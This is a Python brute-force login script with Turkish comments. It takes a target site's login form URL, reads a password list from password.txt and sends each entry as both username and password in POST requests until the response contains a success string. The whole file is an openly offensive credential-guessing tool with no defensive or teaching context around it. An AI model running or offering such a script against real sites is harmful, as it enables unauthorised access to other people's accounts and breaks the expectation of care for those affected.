import requests

def main():
    # Kullanıcıdan hedef site URL'sini alıyoruz
    url = input("Hedef Site (giriş formunun URL'si): ").strip()
    if not url:
        print("URL boş olamaz!")
        return

    # Deneme yapacağımız şifrelerin bulunduğu txt dosyasını açıyoruz
    try:
        with open('password.txt', 'r') as file:
            passwords = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print("password.txt dosyası bulunamadı!")
        return

    if not passwords:
        print("Şifreler dosyası boş!")
        return

    for password in passwords:
        # POST verilerini güncelliyoruz
        data = {
            'username': password,  # Şifreyi kullanıcı adı olarak kullanıyoruz
            'password': password   # Şifreyi şifre olarak kullanıyoruz
        }

        try:
            # POST isteği gönderiyoruz
            response = requests.post(url, data=data)
            response.raise_for_status()  # HTTP hatalarını kontrol et
        except requests.RequestException as e:
            print(f"İstek gönderilirken bir hata oluştu: {e}")
            continue

        # Doğru mu yanlış mı kontrol ediyoruz
        if 'Giriş başarılı' in response.text:  # Burayı uygun yanıt ile değiştirin
            print(f"[ + ] Doğru Şifre!: {password}")
            break
        else:
            print(f"[ - ] Yanlış Şifre!: {password}")

if __name__ == "__main__":
    main()
